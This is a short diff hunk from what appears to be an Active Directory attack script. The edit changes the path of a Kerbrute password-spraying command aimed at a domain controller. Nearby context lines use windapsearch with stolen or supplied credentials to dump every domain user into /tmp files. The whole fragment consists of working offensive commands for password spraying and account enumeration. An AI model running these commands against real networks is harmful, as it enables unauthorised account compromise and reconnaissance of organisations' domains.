@@ -28,7 +28,7 @@ sudo rm /tmp/windapsearch-auth-unconstrained-computers.txt
 
 # Run Kerbrute
 echo "Running Kerbrute against Kerberos"
-kerbrute passwordspray --users "$user_list" --passwords "$password_list" --domain "$domain" --dc "$ip"
+/tmp/kerbrute passwordspray --users "$user_list" --passwords "$password_list" --domain "$domain" --dc "$ip"
 
 #Run LDAP Query WITH Credentials and dump all users
 /tmp/windapsearch -d $domain --dc $ip -u $username -p $password -m users | grep cn: | cut -d " " -f 2 > /tmp/windapsearch-auth-allusers.txt
